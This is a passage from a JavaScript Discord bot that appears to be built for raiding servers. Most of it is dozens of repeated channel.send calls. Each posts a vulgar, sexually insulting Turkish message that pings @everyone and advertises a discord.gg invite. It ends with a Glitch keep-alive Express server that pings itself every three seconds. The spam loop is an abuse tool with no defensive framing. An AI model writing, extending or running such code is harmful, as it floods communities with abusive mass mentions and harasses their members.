              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
    }
});


const http = require("http");
const express = require("express");
const app = express();
function sleep(milliseconds) {
    var start = new Date().getTime();
    for (var i = 0; i < 1e7; i++) {
        if ((new Date().getTime() - start) > milliseconds) {
            break;
        }
    }
}
app.get("/", (request, response) => {
    console.log(Date.now() + " Bot Aktif");
    response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 3000);